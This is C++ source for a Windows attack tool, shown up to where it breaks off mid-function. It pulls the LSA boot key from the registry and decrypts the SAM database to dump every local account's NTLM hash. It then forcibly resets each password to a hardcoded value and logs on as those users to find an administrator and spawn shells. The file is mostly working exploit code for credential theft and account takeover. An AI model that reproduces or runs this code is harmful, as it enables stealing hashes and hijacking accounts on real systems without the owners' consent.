#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <AclAPI.h>
#include <Lmcons.h>
#include <wininet.h>
#include <fdi.h>
#include <fcntl.h>
#include <ktmw32.h>
#include <wuapi.h>
#include <lsalookup.h>
namespace ntsec {
#include <ntsecapi.h>
};
#include <CommCtrl.h>
#include <shlobj.h>
#include <AccCtrl.h>
#include <sddl.h>
#include "offreg.h"
#include "ntdll.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "KtmW32.lib")


#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE



void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
	size_t len = strlen(hex_string);
	if (len % 2 != 0) {
		//fprintf(stderr, "Error: Hex string length must be even.\n");
		return;
	}

	size_t byte_len = len / 2;
	if (byte_len > max_len) {
		//fprintf(stderr, "Error: Output buffer too small.\n");
		return;
	}

	for (size_t i = 0; i < byte_len; i++) {
		// Read two hex characters and convert them to an unsigned int
		unsigned int byte_val;
		if (sscanf(&hex_string[i * 2], "%2x", &byte_val) != 1) {
			//fprintf(stderr, "Error: Invalid hex character in string.\n");
			return;
		}
		byte_array[i] = (unsigned char)byte_val;
	}
}

bool GetLSASecretKey(unsigned char bootkeybytes[16])
{

	const wchar_t* keynames[] = { {L"JD"}, {L"Skew1"}, {L"GBG"}, {L"Data"} };
	int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };


	//ORHKEY hlsa = NULL;
	HKEY hlsa = NULL;
	DWORD err = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", NULL, KEY_READ, &hlsa);
	char data[0x1000] = { 0 };
	DWORD index = 0;
	for (const wchar_t* keyname : keynames)
	{
		DWORD retsz = sizeof(data) / sizeof(char);
		HKEY hbootkey = NULL;
		err = RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);

		err = RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		index += retsz;
		RegCloseKey(hbootkey);
	}
	////printf("%s\n", data);
	RegCloseKey(hlsa);

	if (strlen(data) < 16)
	{
		//printf("Boot key mismatch.");
		return 1;
	}

	// convert hex string to binary
	unsigned char keybytes[16] = { 0 };
	hex_string_to_bytes(data, keybytes, 16);



	for (int i = 0; i < sizeof(keybytes); i++)
	{

		bootkeybytes[i] = keybytes[indices[i]];
	}
	return true;

}

void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen, int* decryptedlen)
{

	char* decrypted = (char*)malloc(enclen);
	memmove(decrypted, hashdata, enclen);
	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

	struct aes128keyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[16];
	} blob;

	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_AES_128;
	blob.keySize = 16;
	memmove(blob.bytes, lsaKey, 16);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(aes128keyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_CBC;
	CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, NULL);

	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, NULL);

	if (decryptedlen)
		*decryptedlen = retsz;

	return decrypted;

}

#ifndef SHA256_DIGEST_LENGTH
#define SHA256_DIGEST_LENGTH 32
#endif

bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
{


	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_SHA_256, NULL, NULL, &Hhash);
	CryptHashData(Hhash, (const BYTE*)data, size, NULL);
	DWORD md_len = 0;
	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, NULL);
	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	return true;
}

void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
{

	int hashlen = data[0];
	int enclen = data[4];

	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	char* cyphertext = (char*)malloc(enclen);
	memmove(cyphertext, &data[0x18], enclen);

	// first arg, lsaKey | second arg, iv | thid arg, ciphertext
	int outsz = 0;
	int pekoutsz = 0;
	char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
	free(cyphertext);

	char* hashdata = (char*)malloc(hashlen);
	memmove(hashdata, &data[0x18 + enclen], hashlen);

	char* hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);
	free(hashdata);

	char hash256[SHA256_DIGEST_LENGTH];

	if (!ComputeSHA256(pek, pekoutsz, hash256))
	{
		free(hash);
		free(pek);
		return NULL;
	}

	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
	{
		//printf("Invalid AES password key.\n");
		free(hash);
		free(pek);
		return NULL;
	}
	free(hash);
	if (keysz)
		*keysz = sizeof(hash256);


	return pek;

}

void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* keysz)
{

	int enctype = samKey[0x68];
	if (enctype == 2) {
		int endofs = samKey[0x6c] + 0x68;
		int len = endofs - 0x70;

		char* data = (char*)malloc(len);
		memmove(data, &samKey[0x70], len);
		void* retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);
		free(data);
		return retval;
	}
	__debugbreak();
	return NULL;

}

void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int* outsz)
{
	int length = data[4];
	if (!length)
		return NULL;
	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	int ciphertextsz = datasz - 24;
	char* ciphertext = (char*)malloc(ciphertextsz);
	memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
	void* result = UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
	free(ciphertext);
	return result;
}

void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
{
	int enctype = data[2];

	switch (enctype)
	{
	case 2:

		return UnprotectPasswordHashAES(key, keysz, data, datasz, outsz);

		break;
	default:
		__debugbreak();
		break;
	}

	return NULL;


}

void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
{

	char* ciphertext2 = (char*)malloc(ciphertextsz);
	memmove(ciphertext2, ciphertext, ciphertextsz);
	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	struct deskeyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[8];
	}blob;
	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_DES;
	blob.keySize = 8;
	memmove(blob.bytes, key, 8);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(deskeyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = ciphertextsz;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)ciphertext2, &retsz);

	if (outsz)
		*outsz = 8;

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, NULL);
	return ciphertext2;

}

char* DeriveDESKey(char data[7])
{
	const int DATA_LEN = 7;

	union keyderv {
		struct {
			char arr[8];
		};
		SIZE_T derv;
	};
	keyderv ttv = { 0 };
	ZeroMemory(ttv.arr, sizeof(ttv.arr));
	memmove(ttv.arr, data, DATA_LEN);
	SIZE_T k = ttv.derv;


	char* key = (char*)malloc(8);

	for (int i = 0; i < 8; i++)
	{
		int j = 7 - i;
		int curr = (k >> (7 * j)) & 0x7F;
		int b = curr;
		b ^= b >> 4;
		b ^= b >> 2;
		b ^= b >> 1;
		int keybyte = (curr << 1) ^ (b & 1) ^ 1;
		key[i] = (char)keybyte;
	}
	return key;
}

void* UnproctectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULONG rid)
{

	union keydata {
		struct {
			char a;
			char b;
			char c;
			char d;
		};
		ULONG data;
	};

	keydata keycontent = { 0 };
	keycontent.data = rid;
	char key1[7] = { keycontent.c,keycontent.b,keycontent.a,keycontent.d, keycontent.c, keycontent.b,keycontent.a };
	char key2[7] = { keycontent.b,keycontent.a,keycontent.d,keycontent.c, keycontent.b, keycontent.a,keycontent.d };

	char* rkey1 = DeriveDESKey(key1);
	char* rkey2 = DeriveDESKey(key2);


	int plaintext1sz = 0;
	int plaintext2sz = 0;
	char* plaintext1 = (char*)UnprotectDES(rkey1, sizeof(key1), ciphertext, ciphersz, &plaintext1sz);
	free(rkey1);
	if (!plaintext1)
	{
		free(rkey2);
		return NULL;
	}
	char* plaintext2 = (char*)UnprotectDES(rkey2, sizeof(key2), &ciphertext[8], ciphersz, &plaintext2sz);
	free(rkey2);
	if (!plaintext2)
	{
		free(plaintext1);
		return NULL;
	}
	void* retval = malloc(plaintext1sz + plaintext2sz);

	memmove(retval, plaintext1, plaintext1sz);
	memmove(RtlOffsetToPointer(retval, plaintext1sz), plaintext2, plaintext2sz);
	free(plaintext1);
	free(plaintext2);
	if (outsz)
		*outsz = plaintext1sz + plaintext2sz;
	return retval;
}

void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, int* outsz, ULONG rid)
{
	int _outsz = 0;
	void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &_outsz);
	if (!dec)
		return NULL;
	int _hashoutsz = 0;
	void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
	free(dec);
	if (outsz)
		*outsz = _hashoutsz;
	return _hash;
}

unsigned char* HexToHexString(unsigned char* data, int size)
{
	unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
	ZeroMemory(retval, size * 2 + 1);
	for (int i = 0; i < size; i++)
	{
		sprintf((char*)&retval[i * 2], "%02x", data[i]);
	}

	return retval;
}

#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
#define SAM_DATABASE_USERNAME_OFFSET 0x0c
#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac

struct PwdEnc
{
	char* buff;
	size_t sz;
	wchar_t* username;
	ULONG usernamesz;
	char* LMHash;
	ULONG LMHashLenght;
	char* NTHash;
	ULONG NTHashLenght;
	ULONG rid;

};


NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT HANDLE* ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
NTSTATUS WINAPI SamCloseHandle(IN HANDLE SamHandle);
NTSTATUS WINAPI SamOpenDomain(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE* DomainHandle);
NTSTATUS WINAPI SamOpenUser(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE* UserHandle);
NTSTATUS WINAPI SamiChangePasswordUser(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE* oldLM, IN const BYTE* newLM, IN BOOL isNewNTLM, IN const BYTE* oldNTLM, IN const BYTE* newNTLM);


char* CalculateNTLMHash(char* _input)
{

	int pw_len = strlen(_input);
	char* input = new char[pw_len * 2];
	for (int i = 0; i < pw_len; i++)
	{
		input[i * 2] = _input[i];
		input[i * 2 + 1] = '\0';
	}


	unsigned int md_len = 0;

	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_MD4, NULL, NULL, &Hhash);

	CryptHashData(Hhash, (const BYTE*)input, pw_len * 2, NULL);

	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	unsigned char* md_value = (unsigned char*)malloc(md_len);
	inputsz = md_len;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)md_value, &inputsz, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	delete[] input;
	return (char*)md_value;

}
bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
{

	wchar_t libpath[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\samlib.dll", libpath, MAX_PATH);

	HMODULE hm = LoadLibrary(libpath);
	if (!hm)
	{
		printf("Failed to load samlib.dll\n");
		return false;
	}
	NTSTATUS(WINAPI * _SamConnect)
		(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted) = (NTSTATUS(WINAPI*)(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted))GetProcAddress(hm, "SamConnect");
	NTSTATUS(WINAPI * _SamCloseHandle)(IN HANDLE SamHandle) = (NTSTATUS(WINAPI*)(IN HANDLE SamHandle))GetProcAddress(hm, "SamCloseHandle");
	NTSTATUS(WINAPI * _SamOpenDomain)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle)
		= (NTSTATUS(WINAPI*)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle))GetProcAddress(hm, "SamOpenDomain");
	NTSTATUS(WINAPI * _SamOpenUser)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle) = (NTSTATUS(WINAPI*)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle))GetProcAddress(hm, "SamOpenUser");
	NTSTATUS(WINAPI * _SamiChangePasswordUser)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM) = (NTSTATUS(WINAPI*)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM))GetProcAddress(hm, "SamiChangePasswordUser");


	if (!_SamConnect || !_SamCloseHandle || !_SamOpenDomain || !_SamOpenUser || !_SamiChangePasswordUser)
	{
		printf("Failed to import required functions from samlib.dll\n");
		return false;
	}

	HANDLE hsrv = NULL;
	NTSTATUS stat = _SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
	if (stat)
	{
		printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
		return false;
	}
	printf("Connected to local SAM.\n");
	LSA_OBJECT_ATTRIBUTES loa = { 0 };
	ntsec::LSA_HANDLE hlsa = NULL;
	stat = ntsec::LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
	if (stat)
	{
		printf("LsaOpenPolicy failed, error : 0x%0.8X\n", stat);
		return false;
	}

	POLICY_ACCOUNT_DOMAIN_INFO* domaininfo = 0;
	stat = ntsec::LsaQueryInformationPolicy(hlsa, ntsec::PolicyAccountDomainInformation, (PVOID*)&domaininfo);
	if (stat)
	{
		printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
		return false;
	}
	wchar_t* stringsid = 0;
	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
	{
		printf("Failed to get string sid, error : %d\n", GetLastError());
		return false;
	}
	printf("Machine SID : %ws\n", stringsid);
	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
	ntsec::LSA_TRANSLATED_SID* lsatrans = 0;
	LSA_UNICODE_STRING lsaunistr = { 0 };
	RtlInitUnicodeString((PUNICODE_STRING)&lsaunistr, username);
	stat = ntsec::LsaLookupNames(hlsa, 1, &lsaunistr, &lsareflist, &lsatrans);
	if (stat)
	{
		printf("LsaLookupNames failed, error : 0x%0.8X\n", stat);
		return false;
	}
	ntsec::LsaClose(hlsa);

	HANDLE hdomain = NULL;
	stat = _SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
	if (stat)
	{
		printf("SamOpenDomain failed, error : 0x%0.8X\n", stat);
		return false;
	}

	HANDLE huser = NULL;
	stat = _SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
	if (stat)
	{
		printf("SamOpenUser failed, error : 0x%0.8X\n", stat);
		return false;
	}

	char* oldNTLM = (char*)nthash;
	char* newNTLM = newNTLMHash ? newNTLMHash : CalculateNTLMHash(newpassword);

	char oldLm[16] = { 0 };
	char newLm[16] = { 0 };
	stat = _SamiChangePasswordUser(huser, false, (BYTE*)oldLm, (BYTE*)newLm, true, (BYTE*)oldNTLM, (BYTE*)newNTLM);

	if (stat)
	{
		printf("SamiChangePasswordUser failed, error : 0x%0.8X\n", stat);
		return false;
	}
	_SamCloseHandle(huser);
	_SamCloseHandle(hdomain);
	_SamCloseHandle(hsrv);
	
	if (newpassword) {
		//printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
	}
	else {
		//printf("Info : user \"%ws\" password has been changed back to older password\n", username);
	}
	
	return true;
}



typedef struct _SYSTEM_PROCESS_INFORMATION2
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize; // since VISTA
	ULONG HardFaultCount; // since WIN7
	ULONG NumberOfThreadsHighWatermark; // since WIN7
	ULONGLONG CycleTime; // since WIN7
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey; // since VISTA (requires SystemExtendedProcessInformation)
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1]; // SystemProcessInformation
	// SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; // SystemExtendedProcessinformation
	// SYSTEM_EXTENDED_THREAD_INFORMATION + SYSTEM_PROCESS_INFORMATION_EXTENSION // SystemFullProcessInformation
} SYSTEM_PROCESS_INFORMATION2, * PSYSTEM_PROCESS_INFORMATION2;

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		0,
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		//printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		//printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

bool DoSpawnShellAsAllUsers(HANDLE samfile)
{

	char newpassword[] = "PRETTY_PRAGUE";
	wchar_t newpassword_unistr[] = L"PRETTY_PRAGUE";
	char* newNTLM = CalculateNTLMHash(newpassword);
	bool isadmin = false;
	char* retval = 0;
	ORHKEY hSAMhive = NULL;
	ORHKEY hSYSTEMhive = NULL;

	SetFilePointer(samfile, NULL, NULL, FILE_BEGIN);
	DWORD err = OROpenHiveByHandle(samfile, &hSAMhive);

	bool systemshelllaunched = false;
	if (err)
	{
		printf("OROpenHive failed with error : %d\n", err);
		return false;
	}

	unsigned char lsakey[16] = { 0 };

	if (!GetLSASecretKey(lsakey))
	{
		printf("Failed to dump LSA secret keys.\n");
		return false;
	}


	ORHKEY hkey = NULL;
	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account", &hkey);

	DWORD valuesz = 0;
	err = ORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
	if (err)
	{
		printf("ORGetValue failed with error : %d\n", err);
		return false;
	}
	char* samkey = (char*)malloc(valuesz);
	err = ORGetValue(hkey, NULL, L"F", NULL, samkey, &valuesz);
	if (err)
	{
		printf("ORGetValue failed with error : %d\n", err);
		return false;
	}

	ORCloseKey(hkey);

	///////////////////////////////////////////////////////////
	int passwordEncryptionKeysz = 0;
	char* passwordEncryptionKey = (char*)UnprotectPasswordEncryptionKey(samkey, lsakey, &passwordEncryptionKeysz);

	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
	if (err)
	{
		printf("OROpenKey failed with error : %d\n", err);
		return false;
	}


	DWORD subkeys = NULL;
	err = ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (err)
	{
		printf("ORQueryInfoKey failed with error : %d\n", err);
		return false;
	}


	PwdEnc** pwdenclist = (PwdEnc**)malloc(sizeof(PwdEnc*) * subkeys);
	int numofentries = 0;
	for (int i = 0; i < subkeys; i++)
	{
		DWORD keynamesz = 0x100;
		wchar_t keyname[0x100] = { 0 };
		err = OREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL);
		if (err)
		{
			printf("OREnumKey failed with error : %d\n", err);
			return false;
		}
		if (_wcsicmp(keyname, L"users") == 0)
			continue;
		ORHKEY hkey2 = NULL;
		err = OROpenKey(hkey, keyname, &hkey2);
		if (err)
		{
			printf("OROpenKey failed with error : %d\n", err);
			return false;
		}
		DWORD valuesz = 0;
		err = ORGetValue(hkey2, NULL, L"V", NULL, NULL, &valuesz);
		if (err == ERROR_FILE_NOT_FOUND)
			continue;
		if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) {
			printf("ORGetValue failed with error : %d\n", err);
			return false;
		}
		PwdEnc* SAMpwd = (PwdEnc*)malloc(sizeof(PwdEnc));
		ZeroMemory(SAMpwd, sizeof(PwdEnc));
		SAMpwd->sz = valuesz;
		SAMpwd->buff = (char*)malloc(valuesz);
		ZeroMemory(SAMpwd->buff, valuesz);
		err = ORGetValue(hkey2, NULL, L"V", NULL, SAMpwd->buff, &valuesz);
		if (err)
		{
			printf("ORGetValue failed with error : %d\n", err);
			return false;
		}
		SAMpwd->rid = wcstoul(keyname, NULL, 16);

		ULONG* accnameoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_OFFSET];
		SAMpwd->username = (wchar_t*)RtlOffsetToPointer(SAMpwd->buff, *accnameoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* usernamesz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_LENGTH_OFFSET];
		SAMpwd->usernamesz = *usernamesz;

		ULONG* LMhashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_OFFSET];
		SAMpwd->LMHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *LMhashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* LMhashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_LENGTH_OFFSET];
		SAMpwd->LMHashLenght = *LMhashsz;

		ULONG* NTHashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_OFFSET];
		SAMpwd->NTHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *NTHashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* NThashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
		SAMpwd->NTHashLenght = *NThashsz;

		pwdenclist[i] = SAMpwd;
		numofentries++;
	}


	wchar_t currentusername[UNLEN + 1] = { 0 };
	DWORD usernamesz = sizeof(currentusername) / sizeof(wchar_t);
	if (!GetUserName(currentusername, &usernamesz))
	{
		printf("Failed to get current user name, error : %d", GetLastError());
		return false;
	}


	for (int i = 0; i < numofentries; i++)
	{
		PwdEnc* samentry = pwdenclist[i];
		int realNTLMHashsz = 0;
		char* realNTLMHash = (char*)UnprotectNTHash(passwordEncryptionKey, passwordEncryptionKeysz, samentry->NTHash, samentry->NTHashLenght, &realNTLMHashsz, samentry->rid);
		char* stringntlm = 0;
		char emptyrepresentation[] = "{NULL}";
		if (realNTLMHashsz)
		{
			stringntlm = (char*)HexToHexString((unsigned char*)realNTLMHash, realNTLMHashsz);
		}
		else
		{

			stringntlm = emptyrepresentation;
		}
		wchar_t username[UNLEN + 1] = { 0 };
		if (samentry->usernamesz <= sizeof(username))
		{
			memmove(username, samentry->username, samentry->usernamesz);
		}
		printf("******************************************\n");
		printf("    User : %ws\n    RID : %d\n    NTLM : %s\n", username, samentry->rid, stringntlm);
		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
			printf("    Skip : NULL NTLM.\n");
			continue;
		}
		if (_wcsicmp(username, currentusername) == 0)
		{
			printf("    Skip : Current User.\n");
			continue;
		}
		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
		{
			printf("    Skip : WDAGUtilityAccount detected.\n");
			continue;
		}

		retval = realNTLMHash;

		if (ChangeUserPassword(username, realNTLMHash, NULL, newNTLM))
		{
			printf("    NewPasswordSet : OK.\n");

			HANDLE htoken = NULL;
			PSID logonsid = 0;
			if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken, &logonsid, NULL, NULL, NULL))
			{
				printf("LogonUserEx failed, error : %d\n", GetLastError());
			}
			if (!systemshelllaunched) {
				TOKEN_ELEVATION_TYPE tokentype;
				DWORD retsz = 0;
				if (!GetTokenInformation(htoken, TokenElevationType, &tokentype, sizeof(tokentype), &retsz))
				{
					printf("GetTokenInformation failed with error : %d\n", GetLastError());
				}

				if (tokentype == TokenElevationTypeLimited)
				{
					TOKEN_LINKED_TOKEN linkedtoken = { 0 };


					if (!GetTokenInformation(htoken, TokenLinkedToken, &linkedtoken, sizeof(TOKEN_LINKED_TOKEN), &retsz))
					{
						printf("GetTokenInformation failed with error : %d\n", GetLastError());
					}

					HANDLE hdup = linkedtoken.LinkedToken;

					DWORD sidsz = MAX_SID_SIZE;
					PSID administratorssid = malloc(sidsz);

					if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, administratorssid, &sidsz))
					{
						printf("Failed to create well known sid, error : %d\n", GetLastError());
					}



					if (!CheckTokenMembership(hdup, administratorssid, (PBOOL)&isadmin))
					{
						printf("CheckTokenMembership failed with error : %d\n", GetLastError());
					}
					free(administratorssid);

					CloseHandle(hdup);
				}

				if (isadmin)
				{
					printf("    IsAdmin : TRUE\n");
					HANDLE htoken2 = NULL;
					if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &htoken2, &logonsid, NULL, NULL, NULL))
					{
						printf("LogonUserEx failed, error : %d\n", GetLastError());
					}
					const wchar_t sid_string[] = L"S-1-16-8192";
					TOKEN_MANDATORY_LABEL integrity;
					PSID  sid = NULL;
					ConvertStringSidToSidW(sid_string, &sid);
